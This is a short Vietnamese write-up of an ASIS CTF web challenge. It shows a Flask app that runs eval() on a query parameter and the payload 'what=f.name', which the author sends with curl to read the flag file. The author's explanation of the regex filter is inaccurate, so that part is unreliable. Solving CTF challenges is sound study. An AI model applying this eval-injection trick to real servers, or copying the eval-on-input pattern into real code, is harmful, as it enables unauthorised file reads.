Bài này cho luôn cả source để chúng ta xem.

```py
#!/usr/bin/env python3
from flask import Flask,request,Response
import random
import re

app = Flask(__name__)
availableDucks = ['duckInABag','duckLookingAtAHacker','duckWithAFreeHugsSign']
indexTemplate = None
flag = None

@app.route('/duck')
def retDuck():
	what = request.args.get('what')
	duckInABag = './images/e146727ce27b9ed172e70d85b2da4736.jpeg'
	duckLookingAtAHacker = './images/591233537c16718427dc3c23429de172.jpeg'
	duckWithAFreeHugsSign = './images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg'

	if(not what or re.search(r'[^A-Za-z\.]',what)):
		return 'what?'

	with open(eval(what),'rb') as f:
		return Response(f.read(), mimetype='image/jpeg')

@app.route("/")
def index():
	return indexTemplate.replace('WHAT',random.choice(availableDucks))

with open('./index.html') as f:
	indexTemplate = f.read() 
with open('/flag.txt') as f:
	flag = f.read()

if(__name__ == '__main__'):
	app.run(port=8000)
```

Nôm na bài này thì chúng ta interact thông qua biến `what` bằng phương thức `get`, để có thể đọc được flag thì chúng ta phải bypass hàm if đầu tiên. 

* Hàm if đầu tiên nó có chức năng tìm ở trong biến `what` nếu có ký tự nào từ `A-Z` hoặc `a-z` và `^ . \` thì sẽ in ra what?. Sau khi thử nhiều cách thì chúng ta không có cách nào để bypass hàm if đó hết và sai lầm của mình là cứ chăm chăm bypass hàm if trong khi không cần thiết :lol:, chúng ta chỉ cần in trực tiếp flag ở trong file f ra mà thôi. 

payload của chúng ta đó là `http://ducks.asisctf.com:8000/duck?what=f.name` 

```cmd
y198@b1nhnt:~$ curl http://ducks.asisctf.com:8000/duck?what=f.name
ASIS{run-away-ducks-are-coming-🦆🦆}
```
